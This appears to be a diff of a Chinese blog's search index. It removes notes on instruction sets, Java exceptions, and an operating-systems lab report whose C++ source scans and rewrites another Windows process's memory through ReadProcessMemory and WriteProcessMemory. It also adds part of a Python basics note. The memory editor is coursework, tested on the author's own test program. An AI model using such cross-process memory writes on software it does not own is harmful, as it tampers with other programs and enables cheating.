-    <url>/2020/06/10/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%8C%87%E4%BB%A4%E9%9B%86%E5%92%8C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BD%8D%E6%95%B0/</url>
-    <content><![CDATA[<h2 id="指令集"><a class="header-anchor" href="#指令集"></a>指令集</h2>
-<p>为了提高编写和运行程序的效率，将一些较为常用的指令（如积分，微分，乘除法等）写成一套标准的程序，即指令集。</p>
-<h3 id="X86和ARM"><a class="header-anchor" href="#X86和ARM"></a>X86和ARM</h3>
-<p>完整的，复杂的指令集称作<code>CISC</code> (Complex Instruction Set Computing)，在复杂指令集中许多运算是不常用的，让CPU支持所有指令是对晶体管的严重浪费，所以亨尼西和帕特森等人提出了一种更加简单的指令集，叫做精简指令集<code>RISC</code> (Reduced Instruction Set Computing)</p>
-<p><code>X86</code>是英特尔推出的一种CPU架构，采用复杂指令集CISC</p>
-<p><code>ARM</code>是acorn公司设计的CPU架构，采用精简指令集RISC</p>
-<h2 id="操作系统位数"><a class="header-anchor" href="#操作系统位数"></a>操作系统位数</h2>
-<p>首先明确<code>CPU位数</code>的概念，CPU位数即CPU在一个时钟周期内能够处理的二进制串的位数，也是CPU寄存器的位数。目前64位的CPU是主流。</p>
-<p>而<strong>操作系统位数</strong>即操作系统所依赖的指令集位数，可以理解为：32位的操作系统假定CPU是32位的，64位操作系统则假定CPU是64位的。所以，64位CPU的主机可以安装64位和32位甚至更低位数的操作系统，而32位CPU的主机只能安装32位及以下的操作系统（即向下兼容）。</p>
-]]></content>
-      <categories>
-        <category>专业课</category>
-        <category>操作系统</category>
-      </categories>
-      <tags>
-        <tag>操作系统</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>操作系统实验——内存扫描器设计实现</title>
-    <url>/2020/06/19/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E2%80%94%E2%80%94%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/</url>
-    <content><![CDATA[<h2 id="实验内容"><a class="header-anchor" href="#实验内容"></a>实验内容</h2>
-<p>(1) 能直接从当前操作系统（或Windows操作系统或Linux操作系统）内存获取内存存储数据；</p>
-<p>(2) 能对获取的数据进行分析，包括内存结构、进程链表、页目录表结构、进程相关信息等；</p>
-<p>(3) 设计物理内存内容的定位功能，能快速回到物理内存的起始地址或结束地址；</p>
-<p>(4) 设计物理内存数据修改功能，并展示内存数据修改后的结果；</p>
-<p>(5) 界面友好</p>
-<h2 id="总体设计"><a class="header-anchor" href="#总体设计"></a>总体设计</h2>
-<p>在本次实验中，我只实现了读取系统和内存信息，获取进程列表及进程相关信息，内存内容搜索，内存内容修改四个功能。每个功能分别由一个程序模块实现。程序开始运行时，调用<code>getSystemInfo</code>函数获取系统及内存基本信息，再调用<code>getProcessInfo</code>函数获取当前正在运行的所有进程及其对应pid，用户输入进程pid选择要扫描的进程后，调用<code>getMemoryBlock</code>扫描该进程使用的内存，逐一打印内存块信息（起始地址、内存块大小、内存块状态、访问权限等），打印完成后用户选择查询内存内容或者修改内存内容，这两个功能分别由<code>SearchProcessMemory</code>和<code>ModifyProcessMemory</code>实现。</p>
-<p><img src="/2020/06/19/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E2%80%94%E2%80%94%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/wps1.jpg" alt="img"></p>
-<h2 id="详细设计与实现"><a class="header-anchor" href="#详细设计与实现"></a>详细设计与实现</h2>
-<h3 id="数据结构设计"><a class="header-anchor" href="#数据结构设计"></a>数据结构设计</h3>
-<ol>
-<li>SYSTEM_INFO 系统信息结构体</li>
-</ol>
-<pre><code>typedef struct _SYSTEM_INFO {
-    __C89_NAMELESS union {
-      DWORD dwOemId;
-      __C89_NAMELESS struct {
-  WORD wProcessorArchitecture;
-  WORD wReserved;
-      } DUMMYSTRUCTNAME;
-    } DUMMYUNIONNAME;
-    DWORD dwPageSize;					//页面大小
-    LPVOID lpMinimumApplicationAddress;	//进程用户区起始地址
-    LPVOID lpMaximumApplicationAddress;	//进程用户区上界
-    DWORD_PTR dwActiveProcessorMask;
-    DWORD dwNumberOfProcessors;
-    DWORD dwProcessorType;
-    DWORD dwAllocationGranularity;
-    WORD wProcessorLevel;
-    WORD wProcessorRevision;
-  } SYSTEM_INFO;
-</code></pre>
-<ol start="2">
-<li>MEMORYSTATUS 内存信息结构体</li>
-</ol>
-<pre><code>typedef struct _MEMORYSTATUS {
-    DWORD dwLength;			//MEMORYSTATUS结构的大小
-    DWORD dwMemoryLoad;		//物理内存使用率
-    SIZE_T dwTotalPhys;		//总物理内存
-    SIZE_T dwAvailPhys;		//可用物理内存
-    SIZE_T dwTotalPageFile;	//总页面文件大小
-    SIZE_T dwAvailPageFile;	//可用页面文件大小
-    SIZE_T dwTotalVirtual;	//总虚拟内存
-    SIZE_T dwAvailVirtual;	//可用虚拟内存
-  } MEMORYSTATUS
-</code></pre>
-<ol start="3">
-<li>PROCESSENTRY32 进程快照信息结构体，用于获取正在运行的所有进程的信息</li>
-</ol>
-<pre><code>typedef struct tagPROCESSENTRY32
-{
-    DWORD dwSize;	//结构体大小
-    DWORD cntUsage;	
-    DWORD th32ProcessID;	//进程ID
-    ULONG_PTR th32DefaultHeapID;
-    DWORD th32ModuleID;
-    DWORD cntThreads;	//线程数
-    DWORD th32ParentProcessID;
-    LONG pcPriClassBase;
-    DWORD dwFlags;
-    TCHAR szExeFile[MAX_PATH];	//进程名称
-} PROCESSENTRY32;
-</code></pre>
-<ol start="4">
-<li>MEMORY_BASIC_INFORMATION32</li>
-</ol>
-<pre><code>typedef struct _MEMORY_BASIC_INFORMATION32 {
-      DWORD BaseAddress;	//指向页面区域基地址的指针
-      DWORD AllocationBase;//指向VirtualAlloc函数分配的页面范围的基地址的指针。BaseAddress成员指向的页面包含在此分配范围内。
-      DWORD AllocationProtect;//最初分配区域时的内存保护选项。该成员可以是内存保护常量之一，如果调用者没有访问权限，则该成员可以为 0。
-      DWORD RegionSize;//从所有页具有相同属性的基地址开始的区域大小
-      DWORD State;//区域中页面的状态，有MEM_COMMIT、MEM_FREE、MEM_RESERVE三种可能
-      DWORD Protect;//区域中页面的访问保护。该成员是为AllocationProtect成员列出的值之一。
-      DWORD Type;区域中页面的类型，有MEM_IMAGE、MEM_MAPPED、MEM_PRIVATE三种可能
-    } MEMORY_BASIC_INFORMATION32;
-</code></pre>
-<h3 id="getSystemInfo-模块的设计与实现"><a class="header-anchor" href="#getSystemInfo-模块的设计与实现"></a>getSystemInfo 模块的设计与实现</h3>
-<p><code>GetSystemInfo(LPSYSTEM_INFO lpSystemInfo)</code>、<code>GlobalMemoryStatus(LPMEMORYSTATUS lpBuffer)</code>两个Windows提供的API可以分别获取系统信息和系统内存信息，在该模块中只要调用两个API后再打印结构体信息即可。</p>
-<h3 id="getProcessInfo-模块的设计与实现"><a class="header-anchor" href="#getProcessInfo-模块的设计与实现"></a>getProcessInfo 模块的设计与实现</h3>
-<p>首先调用<code>CreateToolhelp32Snapshot</code>函数获取进程列表快照的句柄，然后遍历进程快照，轮流显示每个进程的信息（PID、进程名、线程数等）。</p>
-<h3 id="getMemoryBlock-模块的设计与实现"><a class="header-anchor" href="#getMemoryBlock-模块的设计与实现"></a>getMemoryBlock 模块的设计与实现</h3>
-<p>调用<code>OpenProcess()</code>获取想要访问的进程的句柄，循环调用<code>VirtualQueryEx()</code>函数，将返回的<code>MEMORY_BASIC_INFORMATION</code>数据结构保存到列表中，循环遍历列表，打印各个内存块的基本信息。</p>
-<h3 id="SearchProcessMemory-模块的设计与实现"><a class="header-anchor" href="#SearchProcessMemory-模块的设计与实现"></a>SearchProcessMemory 模块的设计与实现</h3>
-<p>循环遍历存有内存块信息的列表MemList，选择状态为<code>MEM_COMMIT</code>的内存块（这些内存块中的数据值是有效的），再通过<code>ReadProcessMemory()</code>访问该内存区域，遍历该区域，将值为我们查找的内容的内存地址加入列表AddrList。最后将AddList中的地址打印出来。</p>
-<h3 id="ModifyProcessMemory-模块的设计与实现"><a class="header-anchor" href="#ModifyProcessMemory-模块的设计与实现"></a>ModifyProcessMemory 模块的设计与实现</h3>
-<p>首先通过<code>OpenProcess()</code>获取进程句柄，需要注意的是，在打开进程时要选择获取所有控制权限，否则可能因为权限过低而无法进行内存的修改。<code>VirtualProtectEx()</code>修改内存块的保护模式，然后通过<code>WriteProcessMemory()</code>写入内存块具体位置的值，最后再次调用<code>VirtualProtectEx()</code>还原内存块的保护模式。</p>
-<h2 id="运行结果"><a class="header-anchor" href="#运行结果"></a>运行结果</h2>
-<p>程序运行界面如图</p>
-<p><img src="/2020/06/19/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E2%80%94%E2%80%94%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/wps2.jpg" alt="img"></p>
-<p><img src="/2020/06/19/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E2%80%94%E2%80%94%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/wps3.jpg" alt="img"></p>
-<p>我们选择要打开的进程，以helloworld测试程序test.exe（PID为1500）为例（系统进程所需权限较高，会打开失败）：</p>
-<p><img src="/2020/06/19/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E2%80%94%E2%80%94%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/wps4.jpg" alt="img"></p>
-<p>可以看到，成功打开进程后，打印了进程使用的内存块信息，打印完成后选择要执行的功能。以下分别演示内存查询和内存修改。</p>
-<p><img src="/2020/06/19/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E2%80%94%E2%80%94%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/wps5.jpg" alt="img"></p>
-<p>可以查到存储的值为123456的内存地址有四个。接下来将其中一个的值修改为234567.</p>
-<p><img src="/2020/06/19/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E2%80%94%E2%80%94%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/wps6.jpg" alt="img"></p>
-<h2 id="源代码"><a class="header-anchor" href="#源代码"></a>源代码</h2>
-<p><em>readMemory.cpp</em></p>
-<pre><code>#include &quot;stdafx.h&quot;
-#include &lt;iostream&gt;
-#include &lt;stdio.h&gt;
-#include &lt;tchar.h&gt;
-#include &lt;windows.h&gt;
-#include &lt;string&gt;
-#include &lt;list&gt;
-#include &lt;iomanip&gt;
-#include &lt;tlhelp32.h&gt;
-#include &lt;psapi.h&gt;
-
-#define MAX_ADDR_NUM 1024
-using namespace std;
-#pragma comment(lib,&quot;psapi.lib&quot;)
-DWORD dwProcessId[1024], cbNeededProcess;
-
-list&lt;MEMORY_BASIC_INFORMATION&gt;	MemList ;
-SYSTEM_INFO systemInfo;
-MEMORYSTATUS memstatus;
-list&lt;DWORD&gt; AddrList;
-
-void getSystemInfo();
-void getProcessInfo();
-bool getMemoryBlock(DWORD dwProcessId);
-bool SearchProcessMemory(DWORD dwProcessId,DWORD dwValue);
-bool ModifyProcessMemory(DWORD dwProcessId,DWORD dwTagAddr,DWORD dwValue);
-
-int _tmain(int argc, _TCHAR* argv[])
-{
-	cout&lt;&lt;&quot;--------系统及内存信息如下-------&quot;&lt;&lt;endl;
-	getSystemInfo();
-
-	//获取当前进程信息
-	cout&lt;&lt;endl&lt;&lt;&quot;-----------进程列表如下----------&quot;&lt;&lt;endl;
-	getProcessInfo();
-
-	DWORD pid;
-	while(TRUE){
-		pid=0;
-		cout&lt;&lt;&quot;输入你需要访问的进程PID号: &quot;;
-		cin&gt;&gt;pid;
-		if(!getMemoryBlock(pid)){
-			cout&lt;&lt;&quot;PID = &quot;&lt;&lt;(DWORD)pid&lt;&lt;&quot; 的进程打开失败!&quot;&lt;&lt;endl;
-		}else{
-			char c;
-			int mode = 0;
-			while(TRUE){
-				cout&lt;&lt;endl&lt;&lt;&quot;q: 返回&quot;&lt;&lt;endl&lt;&lt;&quot;s: 内存查询&quot;&lt;&lt;endl&lt;&lt;&quot;m: 内存修改&quot;&lt;&lt;endl;
-				cout&lt;&lt;&quot;输入功能对应的字母:&quot;;
-				cin&gt;&gt;c;
-				if(c=='q'){
-					break;
-				}
-				else if(c=='s'){
-					DWORD x;
-					cout&lt;&lt;&quot;输入查询的值：&quot;;
-					cin&gt;&gt;x;
-					if(!SearchProcessMemory(pid,x)){
-						cout&lt;&lt;&quot;查询失败!&quot;&lt;&lt;endl;
-					}else{
-						if(AddrList.size()==0){
-							cout&lt;&lt;&quot;未查到值为 &quot;&lt;&lt;(DWORD)x&lt;&lt;&quot; 的内存区域!&quot;&lt;&lt;endl;
-						}else{
-							cout&lt;&lt;&quot;共查到 &quot;&lt;&lt;AddrList.size()&lt;&lt;&quot;个地址&quot;&lt;&lt;endl;
-							list&lt;DWORD&gt;::iterator it;
-							int i=0;
-							for(it=AddrList.begin();it!=AddrList.end();it++){
-								printf(&quot;%d   0x%x \n&quot;,++i,(*it));
-							}
-						}
-					}
-				}
-				else if(c=='m'){
-					DWORD addr;
-					DWORD x;
-					cout&lt;&lt;&quot;要写入的内存地址(16进制)：&quot;&lt;&lt;endl;
-					cin&gt;&gt;hex&gt;&gt;addr;
-					// getchar();
-					cout&lt;&lt;&quot;要写入的值(10进制)：&quot;&lt;&lt;endl;
-					cin&gt;&gt;x;
-					if(ModifyProcessMemory(pid,(DWORD)addr,(DWORD)x)){
-						cout&lt;&lt;&quot;修改成功!&quot;&lt;&lt;endl;
-					}else{
-						cout&lt;&lt;&quot;修改失败!&quot;&lt;&lt;endl;
-					}
-				}
-			}
-		}
-		getProcessInfo();
-	}
-	return 0;
-}
-
-
-
-void getSystemInfo(){
-
-	GetSystemInfo(&amp;systemInfo);
-	cout&lt;&lt;setw(15)&lt;&lt;&quot;进程用户区上界:&quot;&lt;&lt;setw(13)&lt;&lt;systemInfo.lpMaximumApplicationAddress&lt;&lt;endl;
-	cout&lt;&lt;setw(15)&lt;&lt;&quot;进程用户区起始:&quot;&lt;&lt;setw(13)&lt;&lt;systemInfo.lpMinimumApplicationAddress&lt;&lt;endl;
-	cout&lt;&lt;setw(15)&lt;&lt;&quot;页面大小:&quot;&lt;&lt;setw(13)&lt;&lt;systemInfo.dwPageSize&lt;&lt;endl;
-
-
-	GlobalMemoryStatus(&amp;memstatus);
-	cout&lt;&lt;setw(15)&lt;&lt;&quot;物理内存使用率:&quot;&lt;&lt;setw(13)&lt;&lt;memstatus.dwMemoryLoad&lt;&lt;endl;
-	cout&lt;&lt;setw(15)&lt;&lt;&quot;总物理内存:&quot;&lt;&lt;setw(13)&lt;&lt;memstatus.dwTotalPhys&lt;&lt;endl;
-	cout&lt;&lt;setw(15)&lt;&lt;&quot;可用物理内存:&quot;&lt;&lt;setw(13)&lt;&lt;memstatus.dwAvailPhys&lt;&lt;endl;
-	cout&lt;&lt;setw(15)&lt;&lt;&quot;总页文件:&quot;&lt;&lt;setw(13)&lt;&lt;memstatus.dwTotalPageFile&lt;&lt;endl;
-	cout&lt;&lt;setw(15)&lt;&lt;&quot;可用页文件:&quot;&lt;&lt;setw(13)&lt;&lt;memstatus.dwAvailPageFile&lt;&lt;endl;
-	cout&lt;&lt;setw(15)&lt;&lt;&quot;总虚拟内存:&quot;&lt;&lt;setw(13)&lt;&lt;memstatus.dwTotalVirtual&lt;&lt;endl;
-	cout&lt;&lt;setw(15)&lt;&lt;&quot;可用虚拟内存:&quot;&lt;&lt;setw(13)&lt;&lt;memstatus.dwAvailVirtual&lt;&lt;endl;
-}
-
-
-void getProcessInfo(){
-	//为进程列表拍摄快照
-    HANDLE hProcessSnap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
-    if(hProcessSnap==INVALID_HANDLE_VALUE){
-        printf(&quot;CreateToolhelp32Snapshot调用失败!\n&quot;);
-        exit(0);
-    }
-
-    PROCESSENTRY32 pe32;
-    pe32.dwSize = sizeof(PROCESSENTRY32);
-    //遍历进程快照。轮流显示每个进程的信息
-    BOOL bMore=Process32First(hProcessSnap,&amp;pe32);
-    int i=0;
-    printf(&quot;PID\t线程数\t进程名称\n&quot;);
-    while(bMore){
-
-        bMore=Process32Next(hProcessSnap,&amp;pe32);
-        _tprintf(_T(&quot;%u\t&quot;),pe32.th32ProcessID);
-        _tprintf(_T(&quot;%u\t&quot;),pe32.cntThreads);
-        _tprintf(_T(&quot;%s\n&quot;),pe32.szExeFile);
-
-        i++;
-    }
-    //清除snapshot对象
-    CloseHandle(hProcessSnap);
-    printf(&quot;进程总数:%d\n&quot;,i);
-}
-
-
-bool getMemoryBlock(DWORD dwProcessId){
-	MemList.clear();
-	HANDLE hProcess =INVALID_HANDLE_VALUE;
-	if(dwProcessId != GetCurrentProcessId()){
-		hProcess = OpenProcess( PROCESS_QUERY_INFORMATION|PROCESS_VM_READ , FALSE , dwProcessId);
-	}
-	if(hProcess == NULL){
-		return FALSE;
-	}
-	MEMORY_BASIC_INFORMATION  MemBaseInfo;
-	DWORD  dwInfoSize = sizeof(MEMORY_BASIC_INFORMATION);
-	DWORD  dwCurPos = (DWORD)systemInfo.lpMinimumApplicationAddress;
-	while(dwCurPos &lt; (DWORD) systemInfo.lpMaximumApplicationAddress ){
-		VirtualQueryEx( hProcess,(LPVOID)dwCurPos , &amp;MemBaseInfo,dwInfoSize);
-		MemList.push_back(MemBaseInfo);
-		dwCurPos = (DWORD) MemBaseInfo.BaseAddress + MemBaseInfo.RegionSize ;
-	}
-	list&lt;MEMORY_BASIC_INFORMATION&gt;::iterator it = MemList.begin();
-	int num=0;
-	dwCurPos = (DWORD)(*it).BaseAddress;
-	for( ;it != MemList.end(); it++){
-		cout&lt;&lt;dec&lt;&lt;&quot;---- &quot;&lt;&lt;++num&lt;&lt;&quot; ----&quot;&lt;&lt;endl;
-		cout&lt;&lt;&quot;内存块基址: 0x&quot;&lt;&lt;hex&lt;&lt;dwCurPos&lt;&lt;endl;
-		cout&lt;&lt;&quot;保护方式：&quot;&lt;&lt;(*it).AllocationProtect&lt;&lt;endl;
-		cout&lt;&lt;&quot;区域大小：&quot;&lt;&lt;(*it).RegionSize&lt;&lt;endl;
-		cout&lt;&lt;&quot;状态：&quot;;
-		if((*it).State == MEM_COMMIT){
-			cout&lt;&lt;&quot;提交&quot;&lt;&lt;endl;
-		}else if((*it).State == MEM_FREE){
-			cout&lt;&lt;&quot;空闲&quot;&lt;&lt;endl;
-		}else if((*it).State == MEM_RESERVE){
-			cout&lt;&lt;&quot;保留&quot;&lt;&lt;endl;
-		}else{}
-		cout&lt;&lt;&quot;访问保护方式：&quot;;
-		if((*it).Protect == PAGE_READONLY){
-			cout&lt;&lt;&quot;只读&quot;&lt;&lt;endl;
-		}else if((*it).Protect == PAGE_READWRITE ){
-			cout&lt;&lt;&quot;读/写&quot;&lt;&lt;endl;
-		}else if((*it).Protect == PAGE_EXECUTE){
-			cout&lt;&lt;&quot;可执行&quot;&lt;&lt;endl;
-		}else if((*it).Protect == PAGE_EXECUTE_READ){
-			cout&lt;&lt;&quot;可执行/读&quot;&lt;&lt;endl;
-		}else if((*it).Protect == PAGE_EXECUTE_READWRITE){
-			cout&lt;&lt;&quot;可执行/读写&quot;&lt;&lt;endl;
-		}else if((*it).Protect == PAGE_NOACCESS){
-			cout&lt;&lt;&quot;不允许存储&quot;&lt;&lt;endl;
-		}
-		cout&lt;&lt;&quot;类型：&quot;;
-		if((*it).Type == MEM_IMAGE){
-			cout&lt;&lt;&quot;映像&quot;&lt;&lt;endl;
-		}else if((*it).Type == MEM_MAPPED){
-			cout&lt;&lt;&quot;映射&quot;&lt;&lt;endl;
-		}else if((*it).Type == MEM_PRIVATE){
-			cout&lt;&lt;&quot;私有&quot;&lt;&lt;endl;
-		}else{}
-		dwCurPos+=(*it).RegionSize ;
-	}
-	return true;
-}
-
-
-bool SearchProcessMemory(DWORD dwProcessId,DWORD dwValue){
-	AddrList.clear();
-	if(MemList.empty()){
-		return false;
-	}
-	HANDLE hProcess = INVALID_HANDLE_VALUE;
-	if(dwProcessId !=GetCurrentProcessId()){
-		hProcess = OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,FALSE,dwProcessId);
-		if(hProcess ==NULL)
-			return false;
-	}
-	LPBYTE lpBuff = new BYTE[systemInfo.dwPageSize];
-	list&lt;MEMORY_BASIC_INFORMATION&gt;::iterator it;
-	for(it=MemList.begin();it!=MemList.end();it++){
-		if(it-&gt;State != MEM_COMMIT){
-			continue;
-		}
-		DWORD dwSize =0;
-		SIZE_T dwReadBytes=0;
-		while(dwSize &lt; it-&gt;RegionSize){
-			LPVOID lpAddr = (LPVOID)((DWORD)it-&gt;BaseAddress+dwSize);
-			if(ReadProcessMemory(hProcess,lpAddr,lpBuff,systemInfo.dwPageSize,&amp;dwReadBytes)==FALSE){
-				dwSize +=systemInfo.dwPageSize;
-				continue;
-			}
-			for(int i=0;i&lt;dwReadBytes -3;i++){
-				if(*((DWORD *)(lpBuff+i)) ==dwValue){
-					AddrList.push_back((DWORD)lpAddr+i);
-				}
-				if(AddrList.size()==MAX_ADDR_NUM){
-					delete []lpBuff;
-					CloseHandle(hProcess);
-					return true;
-				}
-			}
-			dwSize+=systemInfo.dwPageSize;
-		}
-	}
-	delete []lpBuff;
-	CloseHandle(hProcess);
-	return true;
-}
-
-
-bool ModifyProcessMemory(DWORD dwProcessId,DWORD dwTagAddr,DWORD dwValue){
-	HANDLE hProcess = INVALID_HANDLE_VALUE;
-	if(dwProcessId !=GetCurrentProcessId()){
-		hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwProcessId);
-		if(hProcess ==NULL)
-			return false;
-	}
-	SIZE_T dwWriteBytes =0;
-	DWORD dwOldProtect;
-	if(!VirtualProtectEx(hProcess,(LPVOID)dwTagAddr,sizeof(DWORD),PAGE_EXECUTE_READWRITE,&amp;dwOldProtect)){
-		cout&lt;&lt;&quot;protect!&quot;&lt;&lt;endl;
-		DWORD dwReturn = GetLastError();
-		cout&lt;&lt;dwReturn&lt;&lt;endl;
-	}
-	if(!WriteProcessMemory(hProcess,(LPVOID)dwTagAddr,&amp;dwValue,sizeof(DWORD),&amp;dwWriteBytes)){
-		cout&lt;&lt;&quot;write failed&quot;&lt;&lt;endl;
-		DWORD dwReturn = GetLastError();
-		cout&lt;&lt;dwReturn&lt;&lt;endl;
-		return false;
-	}
-	VirtualProtectEx(hProcess,(LPVOID)dwTagAddr,sizeof(DWORD),dwOldProtect,NULL);
-	CloseHandle(hProcess);
-		return true;
-}
-</code></pre>
-]]></content>
-      <categories>
-        <category>专业课</category>
-        <category>操作系统</category>
-      </categories>
-      <tags>
-        <tag>操作系统</tag>
-        <tag>实验</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Java-GUI编程</title>
     <url>/2020/07/10/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/GUI%E7%BC%96%E7%A8%8B/</url>
     <content><![CDATA[<h2 id="swing"><a class="header-anchor" href="#swing"></a>swing</h2>
@@ -2613,48 +2662,6 @@ bool ModifyProcessMemory(DWORD dwProcessId,DWORD dwTagAddr,DWORD dwValue){
       <tags>
         <tag>Java</tag>
         <tag>GUI</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Java 异常及处理</title>
-    <url>/2020/05/16/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E5%BC%82%E5%B8%B8%E5%8F%8A%E5%A4%84%E7%90%86/</url>
-    <content><![CDATA[<h2 id="分类"><a class="header-anchor" href="#分类"></a>分类</h2>
-<p><img src="/2020/05/16/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E5%BC%82%E5%B8%B8%E5%8F%8A%E5%A4%84%E7%90%86/image-20200516112004702.png" alt="image-20200516112004702"></p>
-<h2 id="异常的处理"><a class="header-anchor" href="#异常的处理"></a>异常的处理</h2>
-<h3 id="向上抛出（throws-异常类型）"><a class="header-anchor" href="#向上抛出（throws-异常类型）"></a>向上抛出（throws+异常类型）</h3>
-<p>不处理异常，将异常抛出给调用者。</p>
-<p><code>throw</code>  、<code>throws</code></p>
-<p>（挖坑待填）</p>
-<h3 id="就地捕获（try-catch-finally）"><a class="header-anchor" href="#就地捕获（try-catch-finally）"></a>就地捕获（try-catch-finally）</h3>
-<p>当程序发生异常时，系统捕获异常，转而执行异常处理代码。</p>
-<ol>
-<li>可能出现异常的代码用<code>try</code>块括起来</li>
-<li>用<code>catch</code>块来捕获异常并处理异常</li>
-<li>一些不论是否出现异常都需要执行的代码，用<code>finally</code>块括起来，使其一定会被执行</li>
-</ol>
-<p><strong>代码执行过程的三种情况</strong></p>
-<ol>
-<li>
-<p>try代码块中无异常，try代码执行完成，则不进入不执行catch(跳过)，执行finally块，及异常块后的其他代码other code；</p>
-</li>
-<li>
-<p>try代码块中发生异常，try代码执行到有异常处即之后中断，产生异常对象(跟踪堆栈,执行流程)，进入catch块(异常类型匹配后处理)，后执行finally块，及异常块后的其他代码other code；</p>
-</li>
-<li>
-<p>try代码块中发生异常，产生异常对象，异常类型不匹配，或者不捕获，程序中断运行(不用try和catch块进行处理，代码在异常出停止)；</p>
-</li>
-</ol>
-<blockquote>
-<p>finally块语句唯一不执行的情况：异常处理代码catch中执行System.exit(1)退出Java虚拟机 ；</p>
-<p>一段代码可能会发生多种类型的异常，当发生异常，会按顺序查看每个catch语句，并执行第一个与异常类型匹配的catch块，执行后，其他的catch语句将忽略，执行继续执行finally块，及异常块后的其他代码other code。</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>编程语言</category>
-        <category>Java</category>
-      </categories>
-      <tags>
-        <tag>Java</tag>
       </tags>
   </entry>
   <entry>
@@ -2695,6 +2702,534 @@ bool ModifyProcessMemory(DWORD dwProcessId,DWORD dwTagAddr,DWORD dwValue){
       </categories>
       <tags>
         <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python基础</title>
+    <url>/2021/01/30/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Python/Python%E5%9F%BA%E7%A1%80%E7%AF%87/</url>
+    <content><![CDATA[<h1>输入输出</h1>
+<p><strong>输出</strong></p>
+<pre><code class="language-python">print('%d,%d'%(i,j),end=&quot;&quot;) # print格式化字符串
+param = 'hello'
+print(f'{param}') # f字符串输出参数
+
+# 浮点数保留精度
+a = 2.345
+print('%.2f'%a) # 2.35 ,四舍五入
+print(round(a,2)) # 2.34 ，五舍六入
+</code></pre>
+<p><strong>输入</strong></p>
+<pre><code class="language-python">a = input(&quot;input a number!\n&quot;)
+</code></pre>
+<h1>常用字符串函数</h1>
+<pre><code class="language-python"># 1.字母处理：
+.upper()    # 全部大写
+.lower()    # 全部小写
+.swapcase()    # 大小写互换
+.capitalize()    # 首字母大写，其余小写
+.title()    # 首字母大写
+
+# 2.格式化相关
+.ljust(width)     # 获取固定长度，左对齐，右边不够用空格补齐
+.rjust(width)     # 获取固定长度，右对齐，左边不够用空格补齐
+.center(width)  # 获取固定长度，中间对齐，两边不够用空格补齐
+.zfill(width)      # 获取固定长度，右对齐，左边不足用0补齐
+
+# 3.字符串搜索相关
+.find()    # 搜索指定字符串，找到则返回对应下标，没有则返回-1
+.index()    # 同上，但是找不到会报错
+.rfind()    # 从右边开始查找
+.count()    # 统计指定的字符串出现的次数
+
+# 4.字符串处理
+.split(&quot;分割符(串)&quot;,[分割次数])	# 分割字符串，得到一个子串列表
+.replace(&quot;原子串&quot;,&quot;新子串&quot;)	# 子串替换
+</code></pre>
+<h1>常用数据结构</h1>
+<p><strong>list-列表</strong></p>
+<pre><code class="language-python">a = []
+a.append('a')	#在列表最后加入一个元素'a'
+a.pop(0)		#删除列表中索引为0的元素
+a.insert(0,'b')	#在列表索引为0的位置插入元素'b',原本该位置及以后的元素后移一位
+a.index('b')	#返回元素'b'在列表中第一次出现的位置
